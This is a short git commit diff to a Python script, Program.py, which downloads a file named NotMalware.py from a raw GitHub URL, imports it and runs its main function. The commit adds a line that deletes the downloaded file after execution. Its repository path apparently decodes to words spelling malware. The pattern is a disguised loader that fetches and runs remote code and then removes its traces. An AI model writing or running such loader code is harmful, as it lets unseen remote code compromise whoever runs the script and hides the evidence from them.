d11d6c403268ec5a756364fec7241adfee69e1ba
HotPogger <will.anstey2005@gmail.com>
2020-11-11 09:15:59 -0500

    Did stuff

--- Program.py
+++ Program.py
@@ -3,6 +3,7 @@ import subprocess
 import sys
 subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]) ##Installs dependency modules
 import requests
+import os
 
 response = requests.get("https://raw.github.com/R0lUSFVC/TUFMV0FS/master/NotMalware.py")
 with open("NotMalware.py", "w") as file:
@@ -10,3 +11,4 @@ with open("NotMalware.py", "w") as file:
 import NotMalware
 platform = platform.system()
 NotMalware.main(platform)
+os.remove("NotMalware.py")
